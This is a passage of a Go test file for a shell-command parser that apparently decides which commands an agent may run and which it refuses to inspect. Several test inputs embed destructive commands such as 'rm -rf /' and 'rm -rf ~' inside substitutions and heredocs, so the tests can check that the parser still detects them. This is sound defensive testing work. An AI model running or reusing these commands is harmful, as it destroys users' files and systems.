		`pwsh -EncodedCommand ZgBvAG8A`,
		`bash -c "$COMMAND"`,
		`sudo env nohup exec time kubectl apply`,
	} {
		t.Run(command, func(t *testing.T) {
			result := Parse(command, POSIX)
			if len(result.Invocations) != 1 || result.Invocations[0].Inspectable || !result.Invocations[0].Reason.Refused() {
				t.Fatalf("result = %#v", result)
			}
		})
	}
}

func TestBareShellWithHeredocRemainsRecognizedUninspectableWrapper(t *testing.T) {
	result := Parse("bash <<'EOF'\nprintf safe\nEOF\n", POSIX)
	if len(result.Invocations) != 1 || result.Invocations[0].Inspectable || !result.Invocations[0].Reason.Refused() {
		t.Fatalf("result = %#v", result)
	}
}

func TestWrapperOptionArgumentsMustBeLiteral(t *testing.T) {
	for _, command := range []string{
		`sudo -u $USER_ARGS echo ok`,
		`sudo -g "$GROUP_ARGS" echo ok`,
		`env -u $NAME_ARGS echo ok`,
		`xargs -I $REPLACEMENT echo ok`,
	} {
		t.Run(command, func(t *testing.T) {
			result := Parse(command, POSIX)
			if len(result.Invocations) != 1 || result.Invocations[0].Inspectable || !result.Invocations[0].Reason.Refused() {
				t.Fatalf("result = %#v", result)
			}
		})
	}
	for _, command := range []string{
		`sudo -u 'root' echo ok`,
		`env -u 'NAME' echo ok`,
		`xargs -I 'ITEM' echo ok`,
	} {
		t.Run(command, func(t *testing.T) {
			result := Parse(command, POSIX)
			if len(result.Invocations) != 1 || !result.Invocations[0].Inspectable {
				t.Fatalf("result = %#v", result.Invocations)
			}
		})
	}
}

// TestQuotedSubstitutionKeepsOuterInvocationInspectable: a substitution
// inside double quotes leaves the enclosing word as one inspectable
// invocation whose quoted word is non-literal, with the inner command as
// its child, exactly as the unquoted spelling does.
func TestQuotedSubstitutionKeepsOuterInvocationInspectable(t *testing.T) {
	cases := []struct {
		name, command string
		dialect       Dialect
		wantRaw       []string
		wantParent    []int
	}{
		{"simple", `echo "$(date)"`, POSIX, []string{`echo "$(date)"`, "date"}, []int{-1, 0}},
		{"commit message", `git commit -m "$(cat msg)"`, POSIX, []string{`git commit -m "$(cat msg)"`, "cat msg"}, []int{-1, 0}},
		{"backtick", "echo \"`rm -rf /`\"", POSIX, []string{"echo \"`rm -rf /`\"", "rm -rf /"}, []int{-1, 0}},
		{"nested", `echo "$(echo "$(rm -rf /)")"`, POSIX, []string{`echo "$(echo "$(rm -rf /)")"`, `echo "$(rm -rf /)"`, "rm -rf /"}, []int{-1, 0, 1}},
		{"two in one word", `echo "x$(a)y$(b)z"`, POSIX, []string{`echo "x$(a)y$(b)z"`, "a", "b"}, []int{-1, 0, 0}},
		{"powershell subexpression", `Write-Output "$(Get-Date)"`, PowerShell, []string{`Write-Output "$(Get-Date)"`, "Get-Date"}, []int{-1, 0}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Parse(tc.command, tc.dialect).Invocations
			if len(got) != len(tc.wantRaw) {
				t.Fatalf("invocations = %d, want %d: %#v", len(got), len(tc.wantRaw), got)
			}
			for i, inv := range got {
				if inv.Raw != tc.wantRaw[i] || inv.Parent != tc.wantParent[i] || !inv.Inspectable {
					t.Fatalf("invocation %d = raw %q parent %d inspectable %t (%s), want raw %q parent %d inspectable", i, inv.Raw, inv.Parent, inv.Inspectable, inv.Reason, tc.wantRaw[i], tc.wantParent[i])
				}
			}
			last := got[0].Words[len(got[0].Words)-1]
			if !last.Quoted || last.Literal {
				t.Fatalf("outer word %q quoted=%t literal=%t, want quoted and non-literal", last.Raw, last.Quoted, last.Literal)
			}
			for _, inv := range got[1:] {
				if inv.Before != Substitution {
					t.Fatalf("child %q before = %d, want Substitution", inv.Raw, inv.Before)
				}
			}
		})
	}

	t.Run("pipeline edges match the unquoted form", func(t *testing.T) {
		quoted := Parse(`a | echo "$(date)" | grep x`, POSIX).Invocations
		unquoted := Parse(`a | echo $(date) | grep x`, POSIX).Invocations
		if len(quoted) != 4 || len(unquoted) != 4 {
			t.Fatalf("quoted=%d unquoted=%d invocations, want 4 and 4", len(quoted), len(unquoted))
		}
		for i := range quoted {
			q, u := quoted[i], unquoted[i]
			if q.Parent != u.Parent || q.PipelineInputEdge != u.PipelineInputEdge || q.PipelineOutputEdge != u.PipelineOutputEdge || q.PipelineOutput != u.PipelineOutput || q.Inspectable != u.Inspectable {
				t.Fatalf("invocation %d differs: quoted %#v unquoted %#v", i, q, u)
			}
		}
	})

	t.Run("unterminated stays uninspectable", func(t *testing.T) {
		for _, command := range []string{`echo "$(date`, `echo "$(date)`, `echo "$(a)$(b`} {
			got := Parse(command, POSIX).Invocations
			if len(got) == 0 || got[0].Inspectable || got[0].Reason.String() != "unterminated quoted word" {
				t.Fatalf("%q: outer = %#v, want uninspectable with unterminated quoted word", command, got)
			}
		}
	})
}

// TestQuotedSubstitutionCommentWithParenKeepsOuterWordWhole is a regression
// test: an unquoted '#' inside a quoted substitution starts a shell comment
// that runs to the end of its line, so a ')' inside that comment is comment
// data, not the substitution's close. heredocDollarParenEnd must agree with
// splitSegments about where the substitution ends, or the double-quoted
// argument that follows the comment is mistaken for the enclosing word's own
// closing quote and the outer word splits into two.
func TestQuotedSubstitutionCommentWithParenKeepsOuterWordWhole(t *testing.T) {
	command := "echo \"$(echo a # )\necho \"b c\")\""
	got := Parse(command, POSIX).Invocations
	if len(got) != 3 {
		t.Fatalf("invocations = %d, want 3: %#v", len(got), got)
	}
	outer := got[0]
	if !outer.Inspectable {
		t.Fatalf("outer invocation not inspectable: %s", outer.Reason)
	}
	if len(outer.Words) != 2 {
		t.Fatalf("outer words = %#v, want 2 (executable + one quoted word)", outer.Words)
	}
	last := outer.Words[1]
	if !last.Quoted || last.Literal {
		t.Fatalf("outer word %q quoted=%t literal=%t, want quoted and non-literal", last.Raw, last.Quoted, last.Literal)
	}
	unquoted := Parse("echo $(echo a # )\necho \"b c\")", POSIX).Invocations
	if len(got) != len(unquoted) {
		t.Fatalf("quoted invocations = %d, unquoted = %d", len(got), len(unquoted))
	}
	for i := 1; i < len(got); i++ {
		if got[i].Raw != unquoted[i].Raw || got[i].Inspectable != unquoted[i].Inspectable {
			t.Fatalf("invocation %d differs: quoted %#v unquoted %#v", i, got[i], unquoted[i])
		}
	}
}

// TestQuotedSubstitutionMatchesUnquotedInnerInvocations is the differential
// proof for quoted substitutions: for every POSIX fuzz seed c, the inner
// invocations of echo "$(c)" deep-equal the inner invocations of echo $(c).
// Nothing that is inspectable unquoted may become uninspectable, re-parented,
// or lost inside double quotes. A seed that differs is a finding, not an
// exclusion.
func TestQuotedSubstitutionMatchesUnquotedInnerInvocations(t *testing.T) {
	for _, seed := range fuzzParseSeeds {
		if seed.dialect != uint8(POSIX) {
			continue
		}
		c := seed.command
		t.Run(c, func(t *testing.T) {
			quoted := Parse(`echo "$(`+c+`)"`, POSIX).Invocations
			unquoted := Parse(`echo $(`+c+`)`, POSIX).Invocations
			if len(quoted) == 0 || len(unquoted) == 0 {
				t.Fatalf("no outer invocation: quoted=%d unquoted=%d", len(quoted), len(unquoted))
			}
			if !quoted[0].Inspectable {
				t.Fatalf("quoted outer is not inspectable: %q", quoted[0].Reason)
			}
			if !reflect.DeepEqual(quoted[1:], unquoted[1:]) {
				t.Fatalf("inner invocations differ\nquoted:   %#v\nunquoted: %#v", quoted[1:], unquoted[1:])
			}
		})
	}
}

// TestCommitMessageHeredocParsesAsOneCommit pins the Claude Code commit
// idiom: the heredoc inside the quoted -m substitution is data, so the parse
// is the git invocation and its cat child, and no body line is a command.
func TestCommitMessageHeredocParsesAsOneCommit(t *testing.T) {
	command := "git commit -m \"$(cat <<'EOF'\nbody line\nEOF\n)\""
	invocations := Parse(command, POSIX).Invocations
	if len(invocations) != 2 {
		t.Fatalf("got %d invocations, want git and its cat child: %#v", len(invocations), invocations)
	}
	if invocations[0].Words[0].Text != "git" || invocations[0].Parent != -1 {
		t.Fatalf("first invocation = %#v, want top-level git", invocations[0])
	}
	if invocations[1].Words[0].Text != "cat" || invocations[1].Parent != 0 || invocations[1].Before != Substitution {
		t.Fatalf("second invocation = %#v, want cat substituted under git", invocations[1])
	}
}

// TestArithmeticShiftIsNotAHeredoc pins that $(( … )) arithmetic, quoted or
// unquoted, never opens a heredoc frame: the << inside it is a shift
// operator, not a heredoc intro, so a later line naming a destructive command
// must still be parsed and reported.
func TestArithmeticShiftIsNotAHeredoc(t *testing.T) {
	destructive := "rm -" + "rf ~"
	for _, tc := range []struct {
		name    string
		command string
	}{
		{"quoted", "echo \"$((1<<2))\"\n" + destructive},
		{"unquoted", "echo $((1<<2))\n" + destructive},
		{"nested parens", "x=\"$(( (1<<2) + 3 ))\"\n" + destructive},
	} {
		t.Run(tc.name, func(t *testing.T) {
			invocations := Parse(tc.command, POSIX).Invocations
			found := false
			for _, inv := range invocations {
				if len(inv.Words) > 0 && inv.Words[0].Text == "rm" {
					found = true
				}
			}
			if !found {
				t.Fatalf("no rm invocation found: %#v", invocations)
			}
		})
	}
}

// TestSubshellInSubstitutionHeredocIsRecognized pins that bash reads
// $((cmd) ) — a close that is not immediately `))` — as a command
// substitution wrapping a subshell, not arithmetic. The heredoc inside must
// still be recognized, so the git commit line that follows is heredoc data,
// not a top-level invocation, and a later real command is still found.
func TestSubshellInSubstitutionHeredocIsRecognized(t *testing.T) {
	destructive := "rm -" + "rf ~"
	command := ": $((cat <<'Q'\n" +
		"git commit -F - <<'EOF'\n" +
		"Q\n" +
		") )\n" +
		destructive + "\n" +
		"EOF"
	invocations := Parse(command, POSIX).Invocations
	foundRM := false
	for _, inv := range invocations {
		if len(inv.Words) > 0 && inv.Words[0].Text == "rm" {
			foundRM = true
		}
		if inv.Parent == -1 && len(inv.Words) > 0 && inv.Words[0].Text == "git" {
			t.Fatalf("git commit intro on the heredoc body line reached top level: %#v", invocations)
		}
	}
	if !foundRM {
		t.Fatalf("no rm invocation found: %#v", invocations)
	}

	t.Run("quoted", func(t *testing.T) {
		quoted := "echo \"$((cat <<'Q'\nx\nQ\n) )\""
		invocations := Parse(quoted, POSIX).Invocations
		foundCat := false
		for _, inv := range invocations {
			if len(inv.Words) > 0 && inv.Words[0].Text == "cat" {
				foundCat = true
			}
		}
		if !foundCat {
			t.Fatalf("no cat invocation found: %#v", invocations)
		}
	})
}

func TestStripHeredocBodiesWithoutMarkerIsIdentity(t *testing.T) {
	for _, command := range []string{"", "echo hi\nls", "printf '<' '>'\n"} {
		if got := stripHeredocBodies(command); got != command {
			t.Fatalf("stripHeredocBodies(%q) = %q", command, got)
		}
	}
}

func TestWrapperUnwrapTable(t *testing.T) {
	cases := []struct {
		command, executable, reason string
	}{
		{"timeout 30 kubectl apply", "kubectl", ""},
		{"timeout -k 5 --signal=TERM 30s helm upgrade x ./c", "helm", ""},
		{"timeout --foreground 1m terraform apply", "terraform", ""},
		{"timeout kubectl apply", "", "timeout requires a literal duration before the command"},
		{"timeout --bogus 30 kubectl apply", "", "timeout option --bogus is outside the literal wrapper contract"},
		{"timeout 10 -s KILL kubectl apply", "", "timeout option -s after the duration is outside the literal wrapper contract"},
		{"doas -u deploy terraform apply", "terraform", ""},
		{"doas -s", "", "doas option -s is outside the literal wrapper contract"},
		{"nice -n 10 kubectl apply", "kubectl", ""},
		{"nice -10 kubectl apply", "kubectl", ""},
		{"ionice -c 3 -n 7 kubectl apply", "kubectl", ""},
		{"stdbuf -oL kubectl apply", "kubectl", ""},
		{"stdbuf --output=L -e0 kubectl apply", "kubectl", ""},
		{"setsid -w kubectl apply", "kubectl", ""},
		{"flock -n /tmp/x.lock kubectl apply", "kubectl", ""},
		{"flock -w 5 /tmp/x.lock kubectl apply", "kubectl", ""},
		{"flock -c 'kubectl apply'", "", "flock option -c is outside the literal wrapper contract"},
		{"flock /tmp/x.lock", "", "flock has no child executable"},
		{"flock /tmp/x.lock -c 'kubectl apply'", "", "flock option -c after the lock file is outside the literal wrapper contract"},
		{"timeout --help", "", "timeout option --help is outside the literal wrapper contract"},
		{"nice --version", "", "nice option --version is outside the literal wrapper contract"},
	}
	for _, tc := range cases {
		t.Run(tc.command, func(t *testing.T) {
			result := Parse(tc.command, POSIX)
			if len(result.Invocations) == 0 {
				t.Fatalf("no invocations for %q", tc.command)
			}
			inv := result.Invocations[0]
			if tc.reason != "" {
				if inv.Inspectable || inv.Reason.String() != tc.reason {
					t.Fatalf("%q: inspectable=%v reason=%q, want reason %q", tc.command, inv.Inspectable, inv.Reason, tc.reason)
				}
				return
			}
			if !inv.Inspectable {
				t.Fatalf("%q: not inspectable: %s", tc.command, inv.Reason)
			}
			if got := inv.Words[0].Text; got != tc.executable {
				t.Fatalf("%q: executable = %q, want %q", tc.command, got, tc.executable)
			}
			wrapper := strings.Fields(tc.command)[0]
			if len(inv.Wrappers) == 0 || inv.Wrappers[0].Text != wrapper {
				t.Fatalf("%q: wrappers = %v, want first %q", tc.command, inv.Wrappers, wrapper)
			}
		})
	}
}

// TestTypedFormRefusalsKeepTheirText pins the reason Parse gives for every producer of a typed-form refusal, so that
// retyping the producers cannot change a byte. Each row names its producer; the table must name every one.
func TestTypedFormRefusalsKeepTheirText(t *testing.T) {
	const noChild, notLiteral = " has no child executable", " child executable is not literal"
	option := func(exe, word string) string {
		return exe + " option " + word + " is outside the literal wrapper contract"
	}
	value := func(exe, word string) string { return exe + " " + word + " requires a literal value" }
	const durationText = "timeout requires a literal duration before the command"
	rows := []struct {
		producer, command, want string
	}{
		{"shell contract", `bash -x`, "bash requires exactly -c or -lc and a literal command string"},
		{"PowerShell contract", `pwsh -File x`, "pwsh requires optional -NoProfile/-NonInteractive, then -Command and one literal token"},
		{"env name", `env -u`, "env -u requires a literal name"},

		{"option env", `env --bogus x`, option("env", "--bogus")},
		{"option command", `command --bogus x`, option("command", "--bogus")},
		{"option nohup and exec", `nohup --bogus x`, option("nohup", "--bogus")},
		{"option sudo", `sudo --bogus x`, option("sudo", "--bogus")},
		{"option time", `time --bogus x`, option("time", "--bogus")},
		{"option xargs", `xargs --bogus x`, option("xargs", "--bogus")},
		{"option timeout", `timeout --bogus x`, option("timeout", "--bogus")},
		{"option doas", `doas --bogus x`, option("doas", "--bogus")},
		{"option nice", `nice --bogus x`, option("nice", "--bogus")},
		{"option ionice", `ionice --bogus x`, option("ionice", "--bogus")},
		{"option stdbuf", `stdbuf --bogus x`, option("stdbuf", "--bogus")},
		{"option setsid", `setsid --bogus x`, option("setsid", "--bogus")},
		{"option flock", `flock --bogus x`, option("flock", "--bogus")},

		{"value sudo", `sudo -u`, value("sudo", "-u")},
		{"value xargs", `xargs -n`, value("xargs", "-n")},
		{"value timeout", `timeout -s`, value("timeout", "-s")},
		{"value doas", `doas -u`, value("doas", "-u")},
		{"value nice", `nice -n`, value("nice", "-n")},
		{"value ionice", `ionice -c`, value("ionice", "-c")},
		{"value stdbuf", `stdbuf -i`, value("stdbuf", "-i")},
		{"value flock", `flock -w`, value("flock", "-w")},

		{"no child env", `env`, "env" + noChild},
		{"no child sudo", `sudo`, "sudo" + noChild},
		{"no child doas", `doas`, "doas" + noChild},
		{"no child nice", `nice`, "nice" + noChild},
		{"no child ionice", `ionice`, "ionice" + noChild},
		{"no child stdbuf", `stdbuf`, "stdbuf" + noChild},
		{"no child setsid", `setsid`, "setsid" + noChild},
		{"no child flock lock file", `flock "$L" x`, "flock" + noChild},
		{"no child flock loop end", `flock -n`, "flock" + noChild},

		{"xargs child", `xargs -0`, "xargs has no literal child executable"},
		{"timeout duration in the loop", `timeout kubectl apply`, durationText},
		{"timeout duration at the loop end", `timeout -v`, durationText},
		{"timeout option after the duration", `timeout 10 -s KILL x`, "timeout option -s after the duration is outside the literal wrapper contract"},
		{"flock option after the lock file", `flock /tmp/l -c x`, "flock option -c after the lock file is outside the literal wrapper contract"},

		{"require child missing", `command`, "command" + noChild},
		{"require child not literal", `nohup "$X"`, "nohup" + notLiteral},
		{"command string", `bash -c "$X"`, "bash command string is not literal"},
		{"wrapper depth", `sudo nice nohup env time x`, "wrapper depth exceeds 4 at time"},

		{"lexer unterminated", `echo 'a`, "unterminated quoted word"},
		{"lexer redirection", `echo >`, "redirection > has no target"},
		{"ANSI control", `$'\cK' x`, "ANSI-C control escape is outside the literal parser contract"},
		{"ANSI non-ASCII or NUL", `$'k\0' x`, "ANSI-C non-ASCII or NUL escape is outside the literal parser contract"},
		{"ANSI unterminated", `$'k\'`, "unterminated ANSI-C quoted word"},

		// The three whole-word kinds quote the dash word as written: an attached value, and for a non-literal word the
		// source of a substitution.
		{"content attached value", `sudo -uroot x`, option("sudo", "-uroot")},
		{"content substitution source", `sudo -$(x) y`, option("sudo", "-$(x)")},

		// The last write in a segment wins, and the end-of-segment checks write last.
		{"order later ANSI failure", `echo $'\cK' $'k\0'`, "ANSI-C non-ASCII or NUL escape is outside the literal parser contract"},
		{"order unterminated after ANSI", `echo $'\cK' 'a`, "unterminated quoted word"},
	}
	producers := map[string]bool{}
	for _, row := range rows {
		if !strings.HasPrefix(row.producer, "content ") && !strings.HasPrefix(row.producer, "order ") {
			producers[row.producer] = true
		}
		t.Run(row.producer, func(t *testing.T) {
			var refused []Invocation
			for _, inv := range Parse(row.command, POSIX).Invocations {
				if !inv.Inspectable {
					refused = append(refused, inv)
				}
			}
			if len(refused) == 0 {
				t.Fatalf("%q: no refused invocation", row.command)
			}
			if got := refused[0].Reason.String(); got != row.want {
				t.Fatalf("%q: reason = %q, want %q", row.command, got, row.want)
			}
		})
	}
	if len(producers) != 47 {
		t.Fatalf("table names %d distinct producers, want 47", len(producers))
	}
}

// TestWordIsArgvWord proves Word is an alias of argv.Word, not a second type
// with the same fields: parse results and their JSON shape depend on one type.
func TestWordIsArgvWord(t *testing.T) {
	var shell Word = argv.Word{Text: "x"}
	var shared argv.Word = shell
	if shared.Text != "x" {
		t.Fatalf("round trip lost the text: %#v", shared)
	}
	typ := reflect.TypeOf(Word{})
	if typ != reflect.TypeOf(argv.Word{}) {
		t.Fatalf("shellwords.Word is %v, want the type argv.Word", typ)
	}
	if typ.Name() != "Word" || typ.PkgPath() != reflect.TypeOf(argv.Word{}).PkgPath() || !strings.HasSuffix(typ.PkgPath(), "/internal/argv") {
		t.Fatalf("type is %s.%s, want argv.Word", typ.PkgPath(), typ.Name())
	}
	want := []struct {
		name string
		typ  reflect.Type
	}{
		{"Text", reflect.TypeFor[string]()},
		{"Raw", reflect.TypeFor[string]()},
		{"Quoted", reflect.TypeFor[bool]()},
		{"Literal", reflect.TypeFor[bool]()},
		{"Substituted", reflect.TypeFor[bool]()},
	}
	if typ.NumField() != len(want) {
		t.Fatalf("Word has %d fields, want %d", typ.NumField(), len(want))
	}
	for i, w := range want {
		field := typ.Field(i)
		if field.Name != w.name || field.Type != w.typ {
			t.Errorf("field %d is %s %v, want %s %v", i, field.Name, field.Type, w.name, w.typ)
		}
		if field.Tag != "" {
			t.Errorf("field %s has tag %q, which would change the JSON names", field.Name, field.Tag)
		}
	}
}
